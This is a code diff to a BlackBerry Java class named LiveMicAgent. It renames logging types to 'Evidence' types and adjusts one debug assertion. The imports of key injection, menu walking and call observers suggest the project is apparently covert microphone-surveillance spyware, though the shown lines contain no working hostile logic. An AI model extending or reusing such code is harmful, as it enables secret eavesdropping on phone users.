@@ -37,14 +37,14 @@ import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.CallListObserver;
 import blackberry.interfaces.PhoneCallObserver;
-import blackberry.log.Log;
-import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -87,7 +87,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         //#endif
 
         //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.NONE,
+        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.NONE,
                 "Wrong Conversion");
         //#endif
 
